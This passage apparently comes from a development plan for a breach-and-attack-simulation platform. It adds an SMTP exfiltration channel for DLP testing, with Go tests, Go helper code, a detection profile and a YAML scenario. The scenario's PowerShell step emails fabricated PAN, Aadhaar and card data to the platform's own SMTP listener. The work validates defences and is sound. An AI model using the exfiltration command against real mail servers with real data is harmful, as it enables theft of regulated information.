	// TestIssueSinkTokensAndSubstitute_SFTPDoesNotIssueOrphanedSecondToken),
	// applied here from the start.
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.003", Command: "Send-MailMessage -Subject '{{SINK_TOKEN}}' -SmtpServer {{SINK_SMTP_HOST}} -Port {{SINK_SMTP_PORT}}"},
		}
		if _, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-smtp-orphan", "https://orchestrator.example:9443", steps); err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		var count int
		if err := pool.QueryRow(context.Background(),
			`SELECT count(*) FROM dlp_sink_tokens WHERE run_id = 'run-smtp-orphan' AND technique_id = 'T1048.003'`,
		).Scan(&count); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if count != 1 {
			t.Fatalf("dlp_sink_tokens rows = %d, want exactly 1 (no orphaned second token from the SMTP block)", count)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SMTPHost_HonorsExplicitOverride(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	t.Setenv("SINK_SMTP_HOST", "smtp-external.example.net")
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.003", Command: "target={{SINK_SMTP_HOST}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-smtp-2", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		if !strings.Contains(out[0].Command, "smtp-external.example.net") {
			t.Fatalf("expected the SINK_SMTP_HOST override to win over the derived publicBaseURL host: %s", out[0].Command)
		}
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/api/... -run SMTP -v 2>&1 | head -40`
Expected: FAIL — `smtpSinkHost`/`smtpSinkPort` undefined, and the SMTP placeholder branch doesn't exist yet so placeholders pass through unsubstituted.

- [ ] **Step 3: Write the implementation**

In `orchestrator/internal/api/dlp_sink.go`, add a new branch to `issueSinkTokensAndSubstitute` immediately after the existing SFTP branch (after the closing `}` of the `if strings.Contains(steps[i].Command, "{{SINK_SFTP_HOST}}") ...` block):

```go
		if strings.Contains(steps[i].Command, "{{SINK_SMTP_HOST}}") || strings.Contains(steps[i].Command, "{{SINK_SMTP_PORT}}") {
			// Same reasoning as the SFTP block above: does NOT issue its
			// own token. SMTP reuses the existing 32-byte {{SINK_TOKEN}}
			// placeholder directly (no DNS-style label-length constraint),
			// and every real SMTP-wired step's command contains
			// {{SINK_TOKEN}} too (as the -Subject value) -- the
			// unconditional block above already issues and substitutes it
			// whenever present.
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_SMTP_HOST}}", smtpSinkHost(publicBaseURL))
			steps[i].Command = strings.ReplaceAll(steps[i].Command, "{{SINK_SMTP_PORT}}", smtpSinkPort())
		}
```

Add the two new helper functions after `sftpSinkPort`:

```go
// smtpSinkHost resolves the {{SINK_SMTP_HOST}} placeholder: an explicit
// SINK_SMTP_HOST environment override if set (for deployments where the
// externally reachable SMTP address differs from publicBaseURL's host,
// e.g. behind NAT), otherwise the same derivation dnsServerHost/
// sftpSinkHost already use -- no new derivation logic.
func smtpSinkHost(publicBaseURL string) string {
	if v := os.Getenv("SINK_SMTP_HOST"); v != "" {
		return v
	}
	return dnsServerHost(publicBaseURL)
}

// smtpSinkPort resolves the {{SINK_SMTP_PORT}} placeholder: the
// configured SINK_SMTP_PORT, defaulting to 587 if unset. Unlike
// sftpSinkPort, this is the SAME value the container-internal listener
// binds -- no host-vs-container split, per the design spec's port
// collision analysis for 587.
func smtpSinkPort() string {
	if v := os.Getenv("SINK_SMTP_PORT"); v != "" {
		return v
	}
	return "587"
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/api/... -run SMTP -v`
Expected: PASS for all 3 new tests.

- [ ] **Step 5: Run the full `internal/api` suite to confirm no regressions**

Run: `cd orchestrator && go test ./internal/api/...`
Expected: PASS, including all existing HTTPS/DNS/SFTP placeholder tests unchanged.

- [ ] **Step 6: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git add internal/api/dlp_sink.go internal/api/dlp_sink_test.go
git commit -m "feat(smtpsink): add SINK_SMTP_HOST/PORT placeholder substitution"
git push
```

---

## Task 5: V1 scenario content

**Files:**
- Create: `orchestrator/scenarios/dlp-exfiltration-smtp.yaml`
- Create: `orchestrator/scenarios/dlp-exfiltration-smtp.yaml.sig`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`
- Modify: `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig`

- [ ] **Step 1: Add the detection-profile entry**

In `orchestrator/scenarios/detection-profiles/windows_dlp_exfiltration.yaml`, add `T1048.003` to the
top-level `technique_ids` list (alongside the existing `T1048.002`), and append a new entry to
`expected_detection` after the existing `dlp-sftp-block` entry:

```yaml
  - id: dlp-smtp-block
    provider: trellix_dlp
    type: dlp
    outcome_family: dlp
    expected_outcome: Block
    verification: automatic
    confidence: required
    finding:
      severity: High
      title: "DLP/mail-gateway controls did not block SMTP exfiltration of regulated data"
      remediation: >-
        Confirm mail-gateway/DLP content inspection covers outbound SMTP
        messages for PAN/Aadhaar/SWIFT/UPI/credit-card patterns in both
        subject and body, and blocks or quarantines the message rather
        than allowing it to reach an external recipient.
      reference: "MITRE ATT&CK T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol"
```

- [ ] **Step 2: Write the scenario**

```yaml
id: dlp-exfiltration-smtp
name: DLP Exfiltration Validation — SMTP Channel
description: >
  Attempts to exfiltrate the same synthetic multi-type sensitive record
  used by dlp-exfiltration-validation.yaml, dlp-exfiltration-sink-https.yaml,
  dlp-exfiltration-dns-tunnel.yaml, and dlp-exfiltration-sftp.yaml
  (fabricated PAN, Aadhaar, SWIFT/BIC, UPI VPA, and credit-card patterns),
  this time as the body and Subject of a real email sent over its own SMTP
  session -- distinct from the HTTP-body, DNS-query-label, and SFTP-upload
  channels already covered.

  Fourth channel of the sink-verified generation of DLP testing (see
  docs/superpowers/specs/2026-09-01-smtp-exfiltration-channel-design.md).
  Verdict comes from whether the platform's own purpose-built SMTP
  listener (internal/smtpsink) ever receives a message whose Subject
  header exact-matches this run's token -- ground truth for whether the
  data left via SMTP, not an inference from a local check. Uses
  PowerShell's built-in Send-MailMessage, always present on both Windows
  PowerShell 5.1 and PowerShell 7+ -- unlike the SFTP channel, there is no
  tool-presence check here, since no realistic "not installed" case
  exists for this scenario to guard against.

  Safety: all synthetic data is fabricated ([BAS-SIM-DLP] tagged), never
  real. The SMTP listener stores only a hash of the message body, never
  the raw content, and it is deliberately unauthenticated (no AUTH
  advertised or required) -- it exists to test whether mail-gateway/DLP
  content inspection catches the message, not to test access control. The
  destination is this same on-prem orchestrator; no external mail server
  is ever contacted. Windows only.
author: Audspect Research
executable: true
supported_os: [windows]
tags:
  - dlp
  - data-protection-validation
  - exfiltration
  - smtp
  - windows
  - mitre-attack
  - bfsi
  - india
mitre_phases:
  - collection
  - exfiltration

steps:
  - name: "DLP Validation — SMTP Exfiltration (T1048.003)"
    technique_id: T1048.003
    detection_profiles:
      - windows_dlp_exfiltration
    framework: custom
    executor: powershell
    requires_priv: user
    timeout_sec: 30
    fidelity: telemetry-safe
    production_safe: true
    risk: low
    blast_radius: "Sends a single small email via SMTP to the platform's own SMTP listener (this same on-prem orchestrator). No real mail server is contacted and no data leaves the environment -- the destination is this same on-prem deployment."
    reversible: true
    telemetry:
      - "Sysmon EID 3: outbound TCP to the orchestrator's own address on the configured SMTP sink port"
      - "Sysmon EID 1: powershell.exe (Send-MailMessage) network activity"
    detection:
      - "DLP/mail-gateway: SMTP protocol and message content inspection (subject + body)"
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $csvContent = "[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111"
      $token = "{{SINK_TOKEN}}"
      $body = "$token`n$csvContent"
      try {
        Send-MailMessage -From "dlptest@sink.audspect.local" -To "dlptest@sink.audspect.local" `
          -Subject $token -Body $body `
          -SmtpServer "{{SINK_SMTP_HOST}}" -Port {{SINK_SMTP_PORT}} `
          -ErrorAction Stop
        Write-Output "DLP_OBSERVATION: send_mail_result=success"
        Write-Output "EXEC T1048.003: SMTP exfiltration attempt completed (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      } catch {
        Write-Output "DLP_OBSERVATION: send_mail_exception=$($_.Exception.Message)"
        Write-Output "EXEC T1048.003: SMTP exfiltration attempt raised a local exception (see sink verification for the actual verdict). [BAS-SIM-DLP-SMTP]"
      }
      # The DLP_OBSERVATION lines above are diagnostic evidence only -- this
      # step's graded verdict comes entirely from whether the SMTP sink
      # actually received a message with a matching Subject, resolved
      # server-side by internal/smtpsink + internal/verifysync +
      # internal/reporting's sink-primary dlpVerifier, never from this
      # script's own success/failure.
    cleanup: ""
```

- [ ] **Step 3: Sign both changed/new scenario files**

```bash
cd orchestrator
go run scripts/signer.go sign private_key.pem scenarios/dlp-exfiltration-smtp.yaml
go run scripts/signer.go sign private_key.pem scenarios/detection-profiles/windows_dlp_exfiltration.yaml
```

- [ ] **Step 4: Verify the scenario loads and its signature checks out**

Create a throwaway test file `orchestrator/zzz_verify_smtp_scenario_load_test.go`:

```go
package orchestrator

import (
	"testing"

	"github.com/audspect/bas/internal/scenario"
)

func TestZZZVerifySMTPScenarioLoads(t *testing.T) {
	eng := scenario.NewEngine("scenarios")
	if err := eng.LoadAll(); err != nil {
		t.Fatalf("LoadAll: %v", err)
	}
	sc, ok := eng.Get("dlp-exfiltration-smtp")
	if !ok {
		t.Fatal("dlp-exfiltration-smtp not found after LoadAll -- check the file and its .sig")
	}
	if len(sc.Steps) != 1 || sc.Steps[0].TechniqueID != "T1048.003" {
		t.Fatalf("unexpected scenario shape: %+v", sc)
	}
}
```

Adjust the package name and `scenario.NewEngine`/`LoadAll`/`Get` call shape to match however the
existing SFTP/DNS throwaway verification tests did this (check
`orchestrator/docs/superpowers/plans/2026-09-01-sftp-exfiltration-channel.md`'s equivalent step for
the exact pattern this repo already uses, since the engine's real loader/signature-check API is
established there, not re-derived here).

Run: `cd orchestrator && go test ./... -run TestZZZVerifySMTPScenarioLoads -v`
Expected: PASS.

Delete the throwaway test file afterward — it must never be committed:

```bash
rm orchestrator/zzz_verify_smtp_scenario_load_test.go
```

- [ ] **Step 5: Commit**

```bash
cd orchestrator
git add scenarios/dlp-exfiltration-smtp.yaml scenarios/dlp-exfiltration-smtp.yaml.sig \
  scenarios/detection-profiles/windows_dlp_exfiltration.yaml \
  scenarios/detection-profiles/windows_dlp_exfiltration.yaml.sig
git commit -m "feat(scenarios): SMTP DLP exfiltration channel (T1048.003)"
git push
```

---

## Task 6: Full verification and handoff

**Files:** none (verification only).

- [ ] **Step 1: Run the full affected-package suite**

Run: `cd orchestrator && go test ./internal/smtpsink/... ./internal/api/... ./internal/verifysync/... ./internal/reporting/... -v 2>&1 | tail -80`
Expected: PASS throughout. In particular, confirm zero changes were needed to
`internal/verifysync.annotateSinkReceipts` or `internal/reporting.dlpVerifier` — both already only
check "does at least one receipt exist for this token," so the SMTP channel's receipts are picked up
automatically once `internal/smtpsink` writes into the same `dlp_sink_receipts` table.

- [ ] **Step 2: Run the broader build and gofmt check**

```bash
cd orchestrator
go build ./...
gofmt -l internal/smtpsink/*.go internal/api/dlp_sink.go internal/api/dlp_sink_test.go cmd/server/main.go config/config.go
```

Expected: clean build, no gofmt output (nothing to reformat).

- [ ] **Step 3: Confirm the roadmap memory note is ready to update**

No code change here — after this task's commit, the DLP exfiltration channel roadmap is HTTPS → DNS
→ SFTP → **SMTP, done**, with ICMP tunneling next in priority order. (Memory update happens outside
this plan, per the project's own memory-maintenance conventions.)

- [ ] **Step 4: Final commit if Steps 1-2 required any fixes**

If any test or build failure surfaced above required a code fix, commit and push it now with a
`fix(smtpsink): ...` message. If everything was already green, this step is a no-op — nothing to
commit.

---

## Self-Review Notes

- **Spec coverage:** Deployment (Task 3), token generation/substitution (Task 4), server + receipt
  persistence (Task 2), security hardening — byte ceiling/rate limit/idle timeout (Task 2), single
  recipient + multipart rejection (Tasks 1 and 2) — V1 scenario content (Task 5), testing (spread
  across every task's TDD steps plus Task 6's full-suite run). No section of the spec is without a
  corresponding task.
- **Deliberate omission vs. SFTP's plan:** SFTP's Task 1 was a `dlpVerifier`/`skip:`-marker fix in
  `internal/reporting/dlp.go`. SMTP needs no equivalent — `Send-MailMessage` is always present, so
  there is no `skip:` case, and the spec explicitly says the two-way `Succeeded`/`Blocked` verdict
  model already in place needs zero changes. This plan has no dlpVerifier task for that reason, not
  by oversight.
- **Type consistency:** `Status`, `Listener`, `NewListener`, `LocalAddr`, `Close`, `Serve`,
  `StartListener` all match `internal/sftpsink`'s exact names/signatures across Tasks 2 and 3, so
  `main.go`'s wiring in Task 3 is a literal drop-in. `smtpSinkHost`/`smtpSinkPort` match
  `sftpSinkHost`/`sftpSinkPort`'s exact shape across Task 4.
- **Placeholder scan:** no TBD/TODO; the one explicit "adjust if the real API differs" note in Task
  2 Step 1 is a concrete verification instruction against a specific external dependency actually
  being fetched in that step, not an unresolved design question in this plan itself.

## Execution

Plan complete and saved to `orchestrator/docs/superpowers/plans/2026-09-01-smtp-exfiltration-channel.md`.
